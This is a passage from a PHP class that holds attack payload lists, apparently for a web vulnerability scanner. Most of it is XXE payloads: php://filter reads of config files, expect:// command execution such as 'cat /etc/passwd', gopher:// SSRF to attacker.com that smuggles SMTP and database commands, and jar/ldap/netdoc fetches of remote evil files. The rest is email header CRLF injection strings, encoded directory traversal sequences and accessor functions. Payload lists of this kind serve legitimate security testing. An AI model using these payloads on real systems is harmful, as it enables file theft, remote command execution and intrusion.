        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=config.php\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=admin.php\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=config.php\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=admin.php\" >]><foo>&xxe;</foo>",
        
        // Expect wrapper XXE
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://id\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://whoami\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://ls\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://cat /etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://pwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://uname -a\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://ps aux\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://netstat -an\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://ifconfig\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://ip addr\" >]><foo>&xxe;</foo>",
        
        // Gopher XXE
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com:25/_HELO%20attacker.com%0AMAIL%20FROM%3A%3C%3F%0ARCPT%20TO%3A%3Cvictim%40gmail.com%3E%0ADATA%0AFrom%3A%20%3Cattacker%40attacker.com%3E%0ATo%3A%20%3Cvictim%40gmail.com%3E%0ASubject%3A%20test%0A%0Atest%0A.%0AQUIT%0A\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com:21/_USER%20anonymous%0APASS%20anonymous%0AQUIT%0A\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com:22/_SSH%20CONNECTION%0A\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com:23/_TELNET%20CONNECTION%0A\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com:80/_GET%20/evil.dtd%20HTTP/1.1%0AHost:%20attacker.com%0A%0A\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com:443/_GET%20/evil.dtd%20HTTP/1.1%0AHost:%20attacker.com%0A%0A\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com:3306/_SELECT%20*%20FROM%20users%0A\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com:5432/_SELECT%20*%20FROM%20users%0A\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com:6379/_GET%20users%0A\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com:27017/_db.users.find()%0A\" >]><foo>&xxe;</foo>",
        
        // Jar XXE
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"jar:http://attacker.com/evil.jar!/evil.class\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"jar:https://attacker.com/evil.jar!/evil.class\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"jar:ftp://attacker.com/evil.jar!/evil.class\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"jar:gopher://attacker.com/evil.jar!/evil.class\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"jar:dict://attacker.com/evil.jar!/evil.class\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"jar:ldap://attacker.com/evil.jar!/evil.class\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"jar:tftp://attacker.com/evil.jar!/evil.class\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"jar:sftp://attacker.com/evil.jar!/evil.class\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"jar:scp://attacker.com/evil.jar!/evil.class\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"jar:ssh://attacker.com/evil.jar!/evil.class\" >]><foo>&xxe;</foo>",
        
        // Netdoc XXE
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"netdoc://attacker.com/evil.txt\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"netdoc://attacker.com/evil.xml\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"netdoc://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"netdoc://attacker.com/evil.html\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"netdoc://attacker.com/evil.php\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"netdoc://attacker.com/evil.js\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"netdoc://attacker.com/evil.css\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"netdoc://attacker.com/evil.json\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"netdoc://attacker.com/evil.yaml\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"netdoc://attacker.com/evil.ini\" >]><foo>&xxe;</foo>",
        
        // Dict XXE
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com:11211/stat\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com:11211/version\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com:11211/stats\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com:11211/settings\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com:11211/items\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com:11211/slabs\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com:11211/connections\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com:11211/evictions\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com:11211/reclaimed\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com:11211/cas_misses\" >]><foo>&xxe;</foo>",
        
        // LDAP XXE
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com:1389/evil\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com:1389/evil.dtd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com:1389/evil.xml\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com:1389/evil.txt\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com:1389/evil.php\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com:1389/evil.js\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com:1389/evil.css\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com:1389/evil.json\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com:1389/evil.yaml\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com:1389/evil.ini\" >]><foo>&xxe;</foo>",
        
        // Alternative encodings
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"UTF-32\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ASCII\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-2\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-3\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-4\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-5\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-6\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-7\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        
        // Alternative DOCTYPE declarations
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        
        // Alternative element names
        "<?xml version=\"1.0\"?><!DOCTYPE bar [<!ELEMENT bar ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><bar>&xxe;</bar>",
        "<?xml version=\"1.0\"?><!DOCTYPE baz [<!ELEMENT baz ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><baz>&xxe;</baz>",
        "<?xml version=\"1.0\"?><!DOCTYPE qux [<!ELEMENT qux ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><qux>&xxe;</qux>",
        "<?xml version=\"1.0\"?><!DOCTYPE quux [<!ELEMENT quux ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><quux>&xxe;</quux>",
        "<?xml version=\"1.0\"?><!DOCTYPE corge [<!ELEMENT corge ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><corge>&xxe;</corge>",
        "<?xml version=\"1.0\"?><!DOCTYPE grault [<!ELEMENT grault ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><grault>&xxe;</grault>",
        "<?xml version=\"1.0\"?><!DOCTYPE garply [<!ELEMENT garply ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><garply>&xxe;</garply>",
        "<?xml version=\"1.0\"?><!DOCTYPE waldo [<!ELEMENT waldo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><waldo>&xxe;</waldo>",
        "<?xml version=\"1.0\"?><!DOCTYPE fred [<!ELEMENT fred ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><fred>&xxe;</fred>",
        "<?xml version=\"1.0\"?><!DOCTYPE plugh [<!ELEMENT plugh ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><plugh>&xxe;</plugh>",
        
        // Alternative entity names
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY evil SYSTEM \"file:///etc/passwd\" >]><foo>&evil;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY hack SYSTEM \"file:///etc/passwd\" >]><foo>&hack;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY exploit SYSTEM \"file:///etc/passwd\" >]><foo>&exploit;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY payload SYSTEM \"file:///etc/passwd\" >]><foo>&payload;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY malware SYSTEM \"file:///etc/passwd\" >]><foo>&malware;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY virus SYSTEM \"file:///etc/passwd\" >]><foo>&virus;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY trojan SYSTEM \"file:///etc/passwd\" >]><foo>&trojan;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY worm SYSTEM \"file:///etc/passwd\" >]><foo>&worm;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY spyware SYSTEM \"file:///etc/passwd\" >]><foo>&spyware;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY keylogger SYSTEM \"file:///etc/passwd\" >]><foo>&keylogger;</foo>"
    ];

    /**
     * Email Header Injection payloads
     */
    public static array $emailHeaderInjection = [
        "test@example.com%0d%0aCc:%20cc@example.com",
        "test@example.com%0d%0aBcc:%20bcc@example.com",
        "test@example.com%0d%0aSubject:%20Injected%20Subject",
        "test@example.com%0d%0aFrom:%20injected@example.com",
        "test@example.com%0d%0aReply-To:%20reply@example.com",
        "test@example.com%0d%0aX-Mailer:%20Injected%20Mailer",
        "test@example.com%0d%0aX-Priority:%201",
        "test@example.com%0d%0aX-MSMail-Priority:%20High",
        "test@example.com%0d%0aImportance:%20High",
        "test@example.com%0d%0aX-Report-Abuse:%20report@example.com",
        "test@example.com%0d%0aX-Confirm-Reading-To:%20confirm@example.com",
        "test@example.com%0d%0aX-PGP-Sig:%20PGP%20Signature",
        "test@example.com%0d%0aX-Originating-IP:%20192.168.1.1",
        "test@example.com%0d%0aX-Authentication-Warning:%20Warning",
        "test@example.com%0d%0aX-Filtered-By:%20Filter",
        "test@example.com%0d%0aX-Spam-Status:%20Yes",
        "test@example.com%0d%0aX-Spam-Score:%20100",
        "test@example.com%0d%0aX-Spam-Flag:%20YES",
        "test@example.com%0d%0aX-Spam-Level:%20*****"
    ];

    /**
     * Directory Traversal payloads
     */
    public static array $directoryTraversal = [
        "../../../",
        "..\\..\\..\\",
        "....//....//....//",
        "..%2F..%2F..%2F",
        "..%5C..%5C..%5C",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5c",
        "..%252f..%252f..%252f",
        "..%255c..%255c..%255c",
        "..%c0%af..%c0%af..%c0%af",
        "..%c1%9c..%c1%9c..%c1%9c",
        "..%c0%af..%c0%af..%c0%af",
        "..%c1%9c..%c1%9c..%c1%9c",
        "..%255c..%255c..%255c",
        "..%252f..%252f..%252f",
        "..%c0%af..%c0%af..%c0%af",
        "..%c1%9c..%c1%9c..%c1%9c",
        "..%255c..%255c..%255c",
        "..%252f..%252f..%252f",
        "..%c0%af..%c0%af..%c0%af"
    ];

    /**
     * Get all payloads as an associative array
     */
    public static function getAll(): array
    {
        return [
            'sql_injection' => self::$sqlInjection,
            'xss' => self::$xss,
            'lfi' => self::$lfi,
            'rfi' => self::$rfi,
            'ssrf' => self::$ssrf,
            'command_injection' => self::$commandInjection,
            'csrf' => self::$csrf,
            'idor' => self::$idor,
            'open_redirect' => self::$openRedirect,
            'xxe' => self::$xxe,
            'email_header_injection' => self::$emailHeaderInjection,
            'directory_traversal' => self::$directoryTraversal
        ];
    }

    /**
     * Get payloads for a specific vulnerability type
     */
    public static function getByType(string $type): array
    {
        $type = strtolower(str_replace([' ', '-', '_'], '', $type));
        
        switch ($type) {
            case 'sqlinjection':
            case 'sql':
                return self::$sqlInjection;
            case 'xss':
                return self::$xss;
            case 'lfi':
                return self::$lfi;
            case 'rfi':
                return self::$rfi;
            case 'ssrf':
                return self::$ssrf;
            case 'commandinjection':
            case 'cmdi':
                return self::$commandInjection;
            case 'csrf':
                return self::$csrf;
            case 'idor':
                return self::$idor;
            case 'openredirect':
            case 'redirect':
                return self::$openRedirect;
            case 'xxe':
                return self::$xxe;
            case 'emailheaderinjection':
            case 'email':
                return self::$emailHeaderInjection;
            case 'directorytraversal':
            case 'traversal':
                return self::$directoryTraversal;
            default:
                return [];
        }
    }
}
